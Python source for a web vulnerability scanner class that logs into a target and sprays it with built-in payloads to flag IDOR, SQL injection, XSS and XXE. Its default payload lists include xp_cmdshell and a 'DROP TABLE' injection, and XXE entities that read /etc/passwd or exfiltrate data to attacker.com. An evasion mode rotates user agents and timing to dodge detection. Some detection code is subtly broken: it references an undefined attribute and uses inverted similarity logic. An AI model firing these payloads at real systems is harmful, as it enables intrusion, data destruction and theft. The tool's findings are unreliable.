import matplotlib.pyplot as plt
from tabulate import tabulate
import requests
from urllib.parse import urlparse, parse_qs, urlencode
import time
import json
import concurrent.futures
import csv
import random
import string
import uuid
from threading import Lock
from bs4 import BeautifulSoup
import re
import base64
import os
from colorama import Fore, Style, init
from difflib import SequenceMatcher
from typing import Dict, List, Optional, Union
import hashlib  # For response hashing
import urllib.parse  # For encoding
import logging  # Added for proper logging

# Initialize colorama for colored output
init(autoreset=True)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.StreamHandler()
    ]
)


class IDORChecker:
    def __init__(
        self,
        url: str,
        delay: float = 1,
        headers: Optional[Dict] = None,
        proxy: Optional[Dict] = None,
        verbose: bool = False,
        sensitive_keywords: Optional[List[str]] = None,
        timeout: int = 10,
        max_retries: int = 3,
        logger: Optional[callable] = None,
        max_workers: int = 5,
        multi_credentials: Optional[List[Dict]] = None,
        thresholds: Optional[Dict] = None,
        evasion: bool = False,
        request_type: str = "query",
        auth_type: str = "basic",
    ):
        """
        Initialize the IDORChecker with the target URL and configuration.
        """
        self.url = url
        self.delay = delay
        self.headers = headers or {}
        self.proxy = proxy
        self.verbose = verbose
        self.sensitive_keywords = sensitive_keywords or [
            "password", "email", "token", "ssn", "credit_card", "phone", "address", "dob"
        ]
        self.session = requests.Session()
        self.multi_sessions = []
        self.rate_limit_detected = False
        self.timeout = timeout
        self.max_retries = max_retries
        self.payload_history = []
        self.logger = logger or logging.info  # Use logging.info instead of print
        self.payload_history_lock = Lock()
        self.max_workers = max_workers
        self.baseline_response = None
        self.baseline_id = None
        self.baseline_data = None
        self.baseline_hash = None
        self.baseline_response_time = 0
        self.thresholds = thresholds or {"structure": 0.8, "content": 0.9, "text": 0.8}
        self.evasion = evasion
        self.request_type = request_type
        self.auth_type = auth_type
        self.baseline_variances = []
        if multi_credentials:
            for creds in multi_credentials:
                session = requests.Session()
                self.multi_sessions.append((session, creds))
        # Parse URL after logger is set
        self.base_url, self.params = self._parse_url(url)

    def login(self, login_url: str, credentials: Dict, method: str = "POST") -> bool:
        """
        Perform a login request to obtain session cookies or tokens. Supports multi-user and advanced auth.
        """
        try:
            if self.multi_sessions:
                successes = []
                for session, creds in self.multi_sessions:
                    response = session.request(
                        method=method.upper(),
                        url=login_url,
                        data=creds if self.auth_type == "basic" else None,
                        json=creds if self.auth_type in ["oauth", "jwt"] else None,
                        headers=self.headers,
                        proxies=self.proxy,
                        timeout=self.timeout,
                    )
                    if response.status_code in (200, 302):
                        if self.auth_type == "jwt" and "token" in response.json():
                            self.headers["Authorization"] = f"Bearer {response.json()['token']}"
                        elif self.auth_type == "oauth" and "access_token" in response.json():
                            self.headers["Authorization"] = f"Bearer {response.json()['access_token']}"
                        if "mfa" in response.text.lower():
                            mfa_code = input("Enter MFA code: ")
                            response = session.post(login_url + "/mfa", data={"code": mfa_code})
                        self._set_baseline_after_login(session=session)
                        successes.append(True)
                    else:
                        successes.append(False)
                return all(successes)
            else:
                response = self.session.request(
                    method=method.upper(),
                    url=login_url,
                    data=credentials,
                    headers=self.headers,
                    proxies=self.proxy,
                    timeout=self.timeout,
                )
                if response.status_code in (200, 302):
                    if self.auth_type == "jwt" and "token" in response.json():
                        self.headers["Authorization"] = f"Bearer {response.json()['token']}"
                    self.logger(f"{Fore.GREEN}Login successful.{Style.RESET_ALL}")
                    self._set_baseline_after_login()
                    return True
                else:
                    self.logger(f"{Fore.RED}Login failed. Status Code: {response.status_code}{Style.RESET_ALL}")
                    return False
        except requests.RequestException as e:
            self.logger(f"{Fore.RED}Error during login: {e}{Style.RESET_ALL}")
            return False
        except json.JSONDecodeError as e:
            self.logger(f"{Fore.RED}Invalid response during login: {e}{Style.RESET_ALL}")
            return False

    def _set_baseline_after_login(self, session=None):
        """
        Fetch current user's profile to set baseline ID and response after login. Collect multiple for variance.
        """
        session = session or self.session
        try:
            baselines = []
            start_time = time.time()
            for _ in range(3):
                response = self._send_request(self.params, "GET", session=session)
                if response and response.status_code == 200:
                    baselines.append(response)
            if baselines:
                self.baseline_response = baselines[0]
                self.baseline_data = self._parse_response_as_json(self.baseline_response.text)
                self.baseline_hash = self._hash_response(self.baseline_response.text)
                if self.baseline_data and "id" in self.baseline_data:
                    self.baseline_id = str(self.baseline_data["id"])
                elif "user_id" in self.params:
                    self.baseline_id = self.params["user_id"]
                self.baseline_response_time = (time.time() - start_time) / 3
                self.baseline_variances = [
                    self._compare_responses(b1.text, b2.text) for b1, b2 in zip(baselines, baselines[1:])
                ]
                avg_variance = (
                    sum(v["text_similarity"] for v in self.baseline_variances) / len(self.baseline_variances)
                    if self.baseline_variances
                    else 0
                )
                self.thresholds["text"] -= avg_variance * 0.1
                self.logger(f"{Fore.CYAN}Baseline set for authorized user ID: {self.baseline_id} with adaptive thresholds.{Style.RESET_ALL}")
            else:
                self.logger(f"{Fore.YELLOW}Could not set baseline after login.{Style.RESET_ALL}")
        except Exception as e:
            self.logger(f"{Fore.RED}Error setting baseline: {e}{Style.RESET_ALL}")

    def _parse_url(self, url: str) -> tuple:
        """
        Parse the URL into base URL and query parameters. Auto-detect path params.
        """
        try:
            parsed_url = urlparse(url)
            if not parsed_url.scheme or not parsed_url.netloc:
                raise ValueError("Invalid URL format")
            base_url = (
                f"{parsed_url.scheme}://{parsed_url.netloc}{'/'.join(parsed_url.path.split('/')[:-1])}"
                if "/" in parsed_url.path
                else f"{parsed_url.scheme}://{parsed_url.netloc}"
            )
            params = parse_qs(parsed_url.query)
            path_parts = parsed_url.path.split("/")
            if len(path_parts) > 1 and path_parts[-1].isdigit():
                params["id"] = [path_parts[-1]]
            common_params = [p for p in params if p.lower() in ["id", "user_id", "file", "invoice"]]
            if common_params:
                self.logger(f"{Fore.CYAN}Auto-detected common params: {common_params}{Style.RESET_ALL}")
            return base_url, params
        except ValueError as ve:
            self.logger(f"{Fore.RED}Validation error in URL parse: {ve}{Style.RESET_ALL}")
            raise
        except Exception as e:
            self.logger(f"{Fore.RED}Unexpected error parsing URL: {e}{Style.RESET_ALL}")
            raise

    def _load_payloads_from_file(self, filename: str) -> List[str]:
        """
        Load payloads from a file.
        """
        try:
            with open(filename, "r", encoding="utf-8") as file:
                payloads = [line.strip() for line in file if line.strip()]
                if not payloads:
                    self.logger(f"{Fore.YELLOW}{filename} is empty. Using default payloads for this type.{Style.RESET_ALL}")
                    return self._get_default_payloads(os.path.basename(filename).split(".")[0])
                return payloads
        except FileNotFoundError:
            self.logger(f"{Fore.RED}Warning: Payload file {filename} not found. Using default payloads.{Style.RESET_ALL}")
            return self._get_default_payloads(os.path.basename(filename).split(".")[0])
        except Exception as e:
            self.logger(f"{Fore.RED}Error loading payloads: {e}{Style.RESET_ALL}")
            return []

    def _get_default_payloads(self, payload_type: str) -> List[str]:
        """
        Get default payloads if file is missing or empty. Expanded with OWASP examples.
        """
        defaults = {
            "sql": [
                "' OR '1'='1' --",
                "' OR 1=1 --",
                "' UNION SELECT 1,2,3 --",
                "' AND 1=CONVERT(int, (SELECT @@version)) --",
                "' WAITFOR DELAY '0:0:5' --",
                "' OR SLEEP(5) --",
                "' UNION SELECT username, password FROM users --",
                "' AND 1=(SELECT COUNT(*) FROM information_schema.tables) --",
                "' OR (SELECT 1 FROM dual WHERE 1=1) --",
                "' EXEC xp_cmdshell 'dir' --",
                "' AND (SELECT 1 FROM sysobjects)=1 --",
                "' OR 1 IN (SELECT table_name FROM information_schema.tables) --",
                "' UNION SELECT NULL, NULL, @@version --",
                "' AND 1=(SELECT TOP 1 name FROM sysusers) --",
                "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
                "' AND (SELECT COUNT(*) FROM users)>0 --",
                "' UNION SELECT 1, password, 3 FROM users WHERE username='admin' --",
                "' OR 1=(SELECT SUBSTRING((SELECT @@version),1,1)) --",
                "' AND IF(1=1, SLEEP(5), 0) --",
                "' EXEC sp_msforeachtable 'DROP TABLE ?' --",
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "<svg onload=alert('XSS')>",
                '"><script>alert(\'XSS\')</script>',
                "<IMG SRC=\"javascript:alert('XSS');\">",
                "<div attr=\"*x\" onblur=\"alert(1)*\">",
                "<script>alert('$varUnsafe')</script>",
                "<script>x='$varUnsafe'</script>",
                "<div onmouseover=\"'$varUnsafe'\"</div>",
                "<style> selector { property : \"$varUnsafe\"; } </style>",
                "<span style=\"property : $varUnsafe\">Oh no</span>",
                "<a href=\"http://www.owasp.org?test=$varUnsafe\">link</a>",
                "<script>Directly in a script</script>",
                "<style>Directly in CSS</style>",
                "<div ToDefineAnAttribute=test />",
                "<ToDefineATag href=\"/test\" />",
                "onclick()",
                "eval()",
            ],
            "xml": [
                "<!DOCTYPE doc [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
                "<!DOCTYPE doc [<!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">]><root>&xxe;</root>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"> %xxe;]><root/>",
                "<!DOCTYPE test [<!ENTITY % file SYSTEM \"file:///nonexistent\"> %file;]><root/>",
                "<!DOCTYPE doc [<!ENTITY % xxe SYSTEM \"http://attacker.com/exfil?data=%file;\"> %xxe;]><root/>",
                "<!DOCTYPE test [<!ENTITY % dtd SYSTEM \"http://evil.com/xxe.dtd\"> %dtd;]><root/>",
                "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol1;</lolz>",
                "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe;]><root/>",
                "<!DOCTYPE doc [<!ENTITY xxe SYSTEM \"ftp://attacker.com/exfil/%file;\">]><root>&xxe;</root>",
                "<!DOCTYPE doc [<!ENTITY internal \"Internal data\"><!ENTITY external SYSTEM \"file:///etc/hosts\">]><root>&external;</root>",
            ],
        }
        return defaults.get(payload_type, [])

    def _generate_payloads(self, param: str, values: List[str]) -> List[Dict]:
        """
        Generate payloads for the specified parameter. Add fuzzing/encodings.
        """
        if not hasattr(self, "_payload_cache"):
            self._payload_cache = {
                "sql": self._load_payloads_from_file("core/sql.txt"),
                "xss": self._load_payloads_from_file("core/xss.txt"),
                "xml": self._load_payloads_from_file("core/xml.txt"),
            }

        payloads = []
        for value in values:
            value_str = str(value)
            new_params = self.params.copy()
            new_params[param] = value_str
            payloads.extend([
                new_params,
                {**new_params, "random_str": self._generate_random_string(10)},
                {**new_params, "random_num": random.randint(1000, 9999)},
                {**new_params, "special_chars": "!@#$%^&*()"},
                {**new_params, "uuid": str(uuid.uuid4())},
                {**new_params, "base64": base64.b64encode(value_str.encode()).decode()},
                {**new_params, "json": json.dumps({"key": value_str})},
                *[{**new_params, "sql_injection": sql} for sql in self._payload_cache["sql"]],
                *[{**new_params, "xss": xss} for xss in self._payload_cache["xss"]],
                *[{**new_params, "xml": xss} for xss in self._payload_cache["xml"]],
            ])
            payloads.append({param: urllib.parse.quote(value_str)})
            if value_str.isdigit():
                payloads.append({param: hex(int(value_str))[2:]})
            payloads.append({param: value_str[::-1]})
        return payloads

    def _generate_random_string(self, length: int) -> str:
        """
        Generate a random string of specified length.
        """
        return "".join(random.choices(string.ascii_letters + string.digits, k=length))

    def _send_request(self, params: Dict, method: str = "GET", session=None) -> Optional[requests.Response]:
        """
        Send a request with the given parameters and method. With evasion and request type support.
        """
        session = session or self.session
        retries = 0
        while retries < self.max_retries:
            try:
                if self.evasion:
                    time.sleep(random.uniform(self.delay * 0.5, self.delay * 1.5))
                    self.headers["User-Agent"] = random.choice([
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
                        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
                        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.48",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari/14.1.1",
                        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                    ])
                    params["dummy"] = self._generate_random_string(5)

                request_args = {"headers": self.headers, "proxies": self.proxy, "timeout": self.timeout}
                if self.request_type == "json":
                    response = session.request(method.upper(), self.base_url, json=params, **request_args)
                elif self.request_type == "graphql":
                    query = {"query": f"{{ resource(id: \"{params.get('id', '')}\") {{ data }} }}"}
                    response = session.post(self.base_url, json=query, **request_args)
                else:
                    if method.upper() == "GET":
                        response = session.get(self.base_url, params=params, **request_args)
                    elif method.upper() in ("POST", "PUT", "DELETE"):
                        response = session.request(method.upper(), self.base_url, data=params, **request_args)
                    else:
                        raise ValueError(f"Unsupported HTTP method: {method}")
                if self._is_rate_limited(response):
                    time.sleep(2 ** retries)
                return response
            except requests.RequestException as e:
                retries += 1
                self.logger(f"{Fore.YELLOW}Request failed (Attempt {retries}/{self.max_retries}): {e}{Style.RESET_ALL}")
            except ValueError as ve:
                self.logger(f"{Fore.RED}Method error: {ve}{Style.RESET_ALL}")
                return None
        return None

    def _construct_url(self, params: Dict) -> str:
        """
        Construct the full URL with query parameters.
        """
        return f"{self.base_url}?{urlencode(params, doseq=True)}"

    def _parse_response_as_json(self, response_text: str) -> Optional[Dict]:
        """
        Attempt to parse response as JSON.
        """
        try:
            return json.loads(response_text)
        except json.JSONDecodeError:
            return None

    def _hash_response(self, response_text: str) -> str:
        """
        Compute a hash of the response text for quick comparison.
        """
        return hashlib.sha256(response_text.encode()).hexdigest()

    def _compare_responses(self, baseline_text: str, test_text: str) -> Dict:
        """
        Compare baseline and test responses for structure, content, and similarity. With noise filtering.
        """
        patterns_to_clean = [r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}", r"\d{10}"]
        cleaned_baseline = baseline_text
        cleaned_test = test_text
        for pattern in patterns_to_clean:
            cleaned_baseline = re.sub(pattern, "", cleaned_baseline)
            cleaned_test = re.sub(pattern, "", cleaned_test)

        baseline_data = self._parse_response_as_json(cleaned_baseline)
        test_data = self._parse_response_as_json(cleaned_test)
        text_similarity = SequenceMatcher(None, cleaned_baseline, cleaned_test).ratio()
        structure_similarity = 0.0
        content_similarity = 0.0
        if baseline_data and test_data:
            structure_similarity = self._compare_response_structure(baseline_data, test_data)
            content_similarity = self._compare_response_content(baseline_data, test_data)
        return {
            "text_similarity": text_similarity,
            "structure_similarity": structure_similarity,
            "content_similarity": content_similarity,
        }

    def _compare_response_structure(self, data1: Dict, data2: Dict) -> float:
        """
        Compare JSON structures (keys) for similarity.
        """
        if not data1 or not data2:
            return 0.0
        keys1 = set(data1.keys())
        keys2 = set(data2.keys())
        intersection = len(keys1 & keys2)
        union = len(keys1 | keys2)
        return intersection / union if union > 0 else 0.0

    def _compare_response_content(self, data1: Dict, data2: Dict) -> float:
        """
        Compare JSON content (values) for similarity.
        """
        if not data1 or not data2:
            return 1.0
        matching_values = sum(1 for k in data1 if k in data2 and data1[k] == data2[k])
        total_keys = len(set(data1.keys()) & set(data2.keys()))
        return matching_values / total_keys if total_keys > 0 else 0.0

    def _contains_sensitive_data(self, response_content: str) -> bool:
        """
        Check if response contains sensitive data. Expanded regex.
        """
        for keyword in self.sensitive_keywords:
            if re.search(rf"\b{keyword}\b", response_content, re.IGNORECASE):
                return True
        if re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", response_content):
            return True
        if re.search(r"\b\d{3}[-.\s]?\d{3}[-.\s]?\d{4}\b", response_content):
            return True
        if re.search(r"\b\d{3}-\d{2}-\d{4}\b", response_content):
            return True
        return False

    def _is_rate_limited(self, response: requests.Response) -> bool:
        """
        Check if response indicates rate limiting.
        """
        return response.status_code == 429 or "rate limit" in response.text.lower()

    def _test_payload(self, payload: Dict, method: str = "GET") -> Optional[Dict]:
        """
        Test a single payload for vulnerabilities, including strong IDOR detection.
        """
        try:
            results = []
            sessions = self.multi_sessions or [(self.session, {"role": "default"})]
            for session, creds in sessions:
                full_url = self._construct_url(payload)
                start_time = time.time()
                response = self._send_request(payload, method, session=session)
                response_time = time.time() - start_time

                if self._is_rate_limited(response):
                    self.rate_limit_detected = True
                    self.logger(f"{Fore.YELLOW}Rate limit detected for {full_url}{Style.RESET_ALL}")
                    continue

                comparison = (
                    self._compare_responses(self.baseline_response.text, response.text)
                    if self.baseline_response
                    else {}
                )
                sensitive_data_detected = self._contains_sensitive_data(response.text)
                idor_detected = self._detect_idor(comparison, response.status_code, creds)
                sql_injection_detected = self._detect_sql_injection(response.text, response.status_code, response_time)
                xss_detected = self._detect_xss(response.text, payload)
                xml_detected = self._detect_xml_injection(response.text, payload)

                result = {
                    "url": full_url,
                    "payload": payload,
                    "status_code": response.status_code,
                    "response_content": response.text[:50] + "..." if response.text else "",
                    "sensitive_data_detected": sensitive_data_detected,
                    "idor_detected": idor_detected,
                    "sql_injection_detected": sql_injection_detected,
                    "xss_detected": xss_detected,
                    "xml_detected": xml_detected,
                    "response_time": response_time,
                    "comparison": comparison,
                    "session_role": creds.get("role", "default"),
                }
                results.append(result)

                if sensitive_data_detected or idor_detected or sql_injection_detected or xss_detected or xml_detected:
                    self.logger(
                        f"{Fore.RED}Vulnerability detected at {full_url} (Session: {creds.get('role')}): "
                        f"Sensitive: {sensitive_data_detected}, IDOR: {idor_detected}, "
                        f"SQL: {sql_injection_detected}, XSS: {xss_detected}, XML: {xml_detected}{Style.RESET_ALL}"
                    )
                elif self.verbose:
                    self.logger(f"{Fore.GREEN}Tested {full_url} (Status: {response.status_code}){Style.RESET_ALL}")
            return results[0] if len(results) == 1 else results
        except requests.RequestException as e:
            self.logger(f"{Fore.RED}Request failed for {full_url}: {e}{Style.RESET_ALL}")
            return None

    def _detect_idor(self, comparison: Dict, status_code: int, creds: Dict) -> bool:
        """
        Detect IDOR based on response comparison. Enhanced with multi-session and thresholds.
        """
        if status_code == 200:
            if (
                comparison.get("structure_similarity", 0) > self.thresholds["structure"]
                and comparison.get("content_similarity", 0) < self.thresholds["content"]
            ):
                return True
            if comparison.get("text_similarity", 0) > self.thresholds["text"]:
                return True
            if self.multi_sessions and creds.get("role") == "low_priv" and comparison["content_similarity"] > 0.7:
                return True
        return False

    def _detect_sql_injection(self, content: str, status_code: int, response_time: float) -> bool:
        """
        Detect SQL injection vulnerabilities, including blind SQLi. Enhanced with DB-specific errors.
        """
        sql_errors = [
            "sql syntax",
            "mysql_fetch",
            "unclosed quotation mark",
            "unknown column",
            "division by zero",
            "error in your SQL syntax",
            "You have an error in your SQL syntax",
            "ORA-01756",
            "Msg 102",
            "PostgreSQL ERROR",
        ]
        if status_code >= 500 or any(error in content.lower() for error in sql_errors):
            return True
        if response_time > self.baseline_response_time * 1.5:
            return True
        if "union select" in str(self.payload).lower() and len(content.split(",")) > len(self.baseline_response.text.split(",")):
            return True
        return False

    def _detect_xss(self, content: str, payload: Dict) -> bool:
        """
        Detect XSS vulnerabilities by checking for unescaped payload reflection. Context-aware.
        """
        xss_payload = payload.get("xss")
        if xss_payload:
            escaped_payload = re.escape(xss_payload)
            # Check for direct reflection of the payload
            if re.search(escaped_payload, content, re.IGNORECASE):
                return True
            # Check for payload in event handler attributes (e.g., onclick="payload")
            if re.search(rf'on\w+="{escaped_payload}"', content, re.IGNORECASE):
                return True
            # Check for payload in alert() or similar JS sinks
            if re.search(rf"alert\(['\"]?{escaped_payload}['\"]?\)", content, re.IGNORECASE):
                return True
        return False

    def _detect_xml_injection(self, content: str, payload: Dict) -> bool:
        """
        Detect XML injection vulnerabilities, including XXE. Enhanced with OOB.
        """
        xml_payload = payload.get("xml")
        if xml_payload and xml_payload in content:
            if re.search(r"/etc/passwd|root|bin|usr|win.ini", content, re.IGNORECASE):
                return True
            if "http://" in xml_payload and re.search(r"attacker.com", content):
                return True
        return False

    def check_idor(
        self,
        param: str,
        test_values: List[str],
        method: str = "GET",
        output_file: Optional[str] = None,
        output_format: str = "txt",
        max_workers: int = 5,
    ) -> List[Dict]:
        """
        Check for IDOR vulnerabilities by testing different values for the specified parameter.
        """
        self.logger(f"{Fore.CYAN}Starting scan for parameter: {param}{Style.RESET_ALL}")
        payloads = self._generate_payloads(param, test_values)
        results = []

        if self.baseline_response is None:
            baseline_payload = self.params.copy()
            self.baseline_response = self._send_request(baseline_payload, method)
            if self.baseline_response:
                self.baseline_data = self._parse_response_as_json(self.baseline_response.text)
                self.baseline_hash = self._hash_response(self.baseline_response.text)
                self.baseline_id = baseline_payload.get(param)
                self.logger(f"{Fore.CYAN}Baseline set for ID: {self.baseline_id} at {self._construct_url(baseline_payload)}{Style.RESET_ALL}")
            else:
                self.logger(f"{Fore.RED}Failed to set baseline response{Style.RESET_ALL}")

        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = [executor.submit(self._test_payload, payload, method) for payload in payloads]
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    with self.payload_history_lock:
                        self.payload_history.append(result)
                    results.extend(result if isinstance(result, list) else [result])

        if output_file:
            if output_format == "csv":
                self._save_results_csv(results, output_file)
            elif output_format == "json":
                self._save_results_json(results, output_file)
            else:
                self._save_results_txt(results, output_file)
            self.logger(f"{Fore.GREEN}Results saved to {output_file}{Style.RESET_ALL}")

        self._display_summary(results)
        return results

    def _save_results_json(self, results: List[Dict], output_file: str):
        """
        Save results to a JSON file.
        """
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2)

    def _save_results_txt(self, results: List[Dict], output_file: str):
        """
        Save results to a text file with cleaner format.
        """
        with open(output_file, "w", encoding="utf-8") as f:
            f.write("IDOR Vulnerability Scan Results\n")
            f.write("=" * 40 + "\n")
            vulnerabilities = [
                r for r in results
                if r["sensitive_data_detected"] or r["idor_detected"] or r["sql_injection_detected"] or r["xss_detected"] or r["xml_detected"]
            ]
            f.write(f"Total Payloads Tested: {len(results)}\n")
            f.write(f"Vulnerabilities Found: {len(vulnerabilities)}\n\n")
            if vulnerabilities:
                f.write("Vulnerabilities Detected:\n")
                for result in vulnerabilities:
                    f.write(f"URL: {result['url']}\n")
                    f.write(f"Payload: {result['payload']}\n")
                    f.write(f"Status Code: {result['status_code']}\n")
                    f.write(f"Sensitive Data: {result['sensitive_data_detected']}\n")
                    f.write(f"IDOR: {result['idor_detected']}\n")
                    f.write(f"SQL Injection: {result['sql_injection_detected']}\n")
                    f.write(f"XSS: {result['xss_detected']}\n")
                    f.write(f"XML: {result['xml_detected']}\n")
                    f.write(f"Response Time: {result['response_time']:.2f}s\n")
                    f.write(f"Comparison: {result['comparison']}\n")
                    f.write(f"Session Role: {result.get('session_role', 'default')}\n")
                    f.write("-" * 40 + "\n")
            else:
                f.write("No vulnerabilities detected.\n")

    def _save_results_csv(self, results: List[Dict], output_file: str):
        """
        Save results to a CSV file.
        """
        with open(output_file, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow([
                "URL", "Payload", "Status Code", "Sensitive Data", "IDOR",
                "SQL Injection", "XSS", "XML", "Response Time", "Comparison", "Session Role"
            ])
            for result in results:
                writer.writerow([
                    result["url"],
                    result["payload"],
                    result["status_code"],
                    result["sensitive_data_detected"],
                    result["idor_detected"],
                    result["sql_injection_detected"],
                    result["xss_detected"],
                    result["xml_detected"],
                    result["response_time"],
                    result["comparison"],
                    result.get("session_role", "default"),
                ])

    def generate_report(self, results: List[Dict], output_file: str, format_type: str = "txt"):
        """
        Generate a report in the specified format.
        """
        if format_type == "json":
            self._save_results_json(results, output_file)
        elif format_type == "csv":
            self._save_results_csv(results, output_file)
        else:
            self._save_results_txt(results, output_file)
        self.logger(f"{Fore.GREEN}Report generated: {output_file}{Style.RESET_ALL}")

    def visualize_results(self, results: List[Dict]):
        """
        Visualize scan results with matplotlib.
        """
        vulnerable_count = sum(
            1 for r in results
            if r["sensitive_data_detected"] or r["idor_detected"] or r["sql_injection_detected"] or r["xss_detected"] or r["xml_detected"]
        )
        safe_count = len(results) - vulnerable_count
        labels = ["Vulnerable", "Safe"]
        sizes = [vulnerable_count, safe_count]
        colors = ["red", "green"]

        plt.figure(figsize=(8, 6))
        plt.pie(sizes, labels=labels, colors=colors, autopct="%1.1f%%", startangle=90)
        plt.title("Vulnerability Summary")
        plt.axis("equal")
        plt.show()

        table_data = [
            [
                r["url"], r["status_code"], r["sensitive_data_detected"], r["idor_detected"],
                r["sql_injection_detected"], r["xss_detected"], r["xml_detected"], r.get("session_role")
            ]
            for r in results
            if r["sensitive_data_detected"] or r["idor_detected"] or r["sql_injection_detected"] or r["xss_detected"] or r["xml_detected"]
        ]
        headers = ["URL", "Status Code", "Sensitive Data", "IDOR", "SQL Injection", "XSS", "XML", "Session Role"]
        if table_data:
            print(tabulate(table_data, headers=headers, tablefmt="grid"))

    def _display_summary(self, results: List[Dict]):
        """
        Display a clean summary of scan results.
        """
        vulnerabilities = [
            r for r in results
            if r["sensitive_data_detected"] or r["idor_detected"] or r["sql_injection_detected"] or r["xss_detected"] or r["xml_detected"]
        ]
        self.logger(f"\n{Fore.CYAN}Scan Summary:{Style.RESET_ALL}")
        self.logger(f"Total Payloads Tested: {len(results)}")
        self.logger(f"Vulnerabilities Found: {len(vulnerabilities)}")
        if vulnerabilities:
            self.logger(f"\n{Fore.RED}Vulnerabilities Detected:{Style.RESET_ALL}")
            for result in vulnerabilities:
                self.logger(f"URL: {result['url']}")
                self.logger(f"Payload: {result['payload']}")
                self.logger(f"Status Code: {result['status_code']}")
                self.logger(f"Sensitive Data: {result['sensitive_data_detected']}")
                self.logger(f"IDOR: {result['idor_detected']}")
                self.logger(f"SQL Injection: {result['sql_injection_detected']}")
                self.logger(f"XSS: {result['xss_detected']}")
                self.logger(f"XML: {result['xml_detected']}")
                self.logger(f"Response Time: {result['response_time']:.2f}s")
                self.logger(f"Comparison: {result['comparison']}")
                self.logger(f"Session Role: {result.get('session_role', 'default')}")
                self.logger("-" * 40)
        else:
            self.logger(f"{Fore.GREEN}No vulnerabilities detected.{Style.RESET_ALL}")

        if results and self.verbose:
            visualize = input("\nVisualize results? (y/n): ").strip().lower()
            if visualize == "y":
                self.visualize_results(results)
